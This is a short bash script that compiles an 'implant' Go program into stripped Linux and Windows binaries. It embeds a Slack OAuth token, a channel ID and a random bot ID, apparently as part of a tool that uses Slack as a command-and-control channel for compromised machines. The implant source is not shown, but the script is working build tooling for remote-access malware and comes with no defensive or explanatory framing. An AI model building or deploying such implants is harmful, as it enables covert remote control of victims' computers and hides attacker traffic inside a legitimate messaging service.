#!/bin/bash
mkdir -p output
rm output/* 2>/dev/null

UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)

if [ -z $1 ] ; then
    echo -n "Enter the channel ID: "
    read CHANID
else
    CHANID=$1
fi

if [ -z $2 ] ; then 
    echo -n "Enter the Slack OAuth Access Token: "
    read TOKEN
else 
    TOKEN=$2
fi

echo "The bot ID is $UUID"
ARGS="-X 'main.UUID=$UUID' -X 'main.CHANID=$CHANID' -X 'main.SLACKTOKEN=$TOKEN'"

echo "Compiling..."
env GOOS=linux GOARCH=amd64 go build -ldflags "-s -w $ARGS" -o output/lin_implant.bin implant.go
env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w $ARGS" -o output/win_implant.exe implant.go
